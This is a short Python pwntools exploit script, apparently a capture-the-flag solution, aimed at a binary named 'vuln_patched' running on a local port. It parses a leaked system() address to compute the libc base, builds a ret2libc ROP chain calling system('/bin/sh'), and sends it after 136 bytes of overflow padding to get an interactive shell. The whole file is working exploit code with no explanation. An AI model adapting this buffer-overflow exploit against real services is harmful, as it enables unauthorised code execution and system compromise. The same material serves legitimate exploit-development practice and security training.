#!/usr/bin/env python3

from pwn import *

context.binary   = elf = ELF('./vuln_patched')
libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')
context.terminal = ['xfce4-terminal', '-e']
context.log_level = 'debug'

#p = process(elf.path)
p = remote("127.0.0.1", 5000)
#gdb.attach(p, '''b *main''')

p.sendline(b'elmo')
p.recvuntil(b"here's a system():")
system = int(p.recvline().strip(), 16)
libc.address = system - libc.symbols['system']
log.info(f'libc base: {hex(libc.address)}')

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))
log.info(f'rop chain: {rop.dump()}')

payload = flat(
    b"A" * 136,
    rop.chain()
)


p.sendline(payload)
p.interactive()